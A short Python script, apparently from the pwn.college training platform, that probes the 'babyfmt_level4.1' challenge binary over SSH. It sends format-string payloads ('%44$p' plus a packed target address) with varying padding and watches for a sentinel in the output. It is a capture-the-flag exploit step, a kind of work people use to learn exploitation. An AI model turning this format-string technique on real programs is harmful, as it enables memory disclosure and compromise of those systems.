import subprocess
import struct

ADDR = 0x4040E0
TOTAL = 0x79
SENTINEL = "XYZ "
SHIFT = 1
prefix = "B" * SHIFT + "A" * (TOTAL - len(SENTINEL) - SHIFT) + SENTINEL
SSH = [
    "ssh",
    "-i",
    "../key",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level4.1",
]

for pad in range(8):
    fmt = f"{prefix}%44$p".encode()
    payload = fmt + b"A" * pad + struct.pack("<Q", ADDR)
    res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    out = res.stdout.decode("latin-1", errors="ignore")
    print("pad", pad)
    for line in out.splitlines():
        if SENTINEL.strip() in line:
            print(line)
            break
